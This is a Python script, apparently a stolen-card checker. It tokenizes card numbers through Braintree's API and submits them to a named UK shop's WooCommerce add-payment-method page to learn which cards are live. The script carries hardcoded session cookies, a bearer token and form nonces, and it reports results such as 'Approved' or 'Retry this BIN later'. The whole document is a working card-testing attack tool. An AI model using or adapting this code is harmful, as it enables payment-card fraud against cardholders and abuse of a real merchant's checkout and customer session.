def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()








































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzA0ODE4MDIsImp0aSI6ImU3ZDliMTQyLTg3ZDEtNDg0Ny04MjQxLTQwYzVmMjZhY2VhNSIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.137TTU4WMpgZzKX4cubUw1xOFLdstYUk9GX58OBW0PMOTXeridwtkIRGcJLqBlXtO7Hgxlw5sjPvpipP19GqbQ',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '7118f078-5921-494b-badc-32f1c9c08467',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"7118f078-5921-494b-badc-32f1c9c08467"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115165916295100","expirationMonth":"08","expirationYear":"2025","cvv":"088"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
#2






	cookies = {
    '_ga': 'GA1.1.42703121.1724799079',
    'eucookielaw': '1740351081636',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-31%2017%3A20%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2024-10-31%2017%3A20%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'tk_ai': 'jetpack%3Ah5lHHSbzEZRzLqWmjMD099iX',
    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb-0018%7C1731604973%7Cjk8YrTkcoo5koRMpPgq81Uu1gefizy84iBBT3N43stG%7C1b800d486e7ddfa2f6f6e8c37a46bb44292785b2a3fcbf945512d28a8dcf75f8',
    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '422%7C%7C1730568145%7C%7C1730564545%7C%7C74e0224ed540419ff9d66af361e613a1',
    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '422%7Cother%7Cread%7C932c7317eac2a81a866a7b1314851b2ca8be180f252631a018651a1eb5d95dbd',
    '_ga_EX1GV7CW1V': 'GS1.1.1730394908.12.1.1730395375.0.0.0',
    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_347410393': 'GS1.1.1730394908.16.1.1730395401.0.0.0',
}

	headers = {
    'authority': 'www.carolyngibbsquilts.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.42703121.1724799079; eucookielaw=1740351081636; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-31%2017%3A20%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-31%2017%3A20%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; tk_ai=jetpack%3Ah5lHHSbzEZRzLqWmjMD099iX; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb-0018%7C1731604973%7Cjk8YrTkcoo5koRMpPgq81Uu1gefizy84iBBT3N43stG%7C1b800d486e7ddfa2f6f6e8c37a46bb44292785b2a3fcbf945512d28a8dcf75f8; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=422%7C%7C1730568145%7C%7C1730564545%7C%7C74e0224ed540419ff9d66af361e613a1; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=422%7Cother%7Cread%7C932c7317eac2a81a866a7b1314851b2ca8be180f252631a018651a1eb5d95dbd; _ga_EX1GV7CW1V=GS1.1.1730394908.12.1.1730395375.0.0.0; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_347410393=GS1.1.1730394908.16.1.1730395401.0.0.0',
    'origin': 'https://www.carolyngibbsquilts.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"0101b24b6f061eadca858c9846b109d9"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok,),
    ('wc_braintree_device_data', '{"correlation_id":"0101b24b6f061eadca858c9846b109d9"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '862e2dc4e8'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post(
    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
    
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

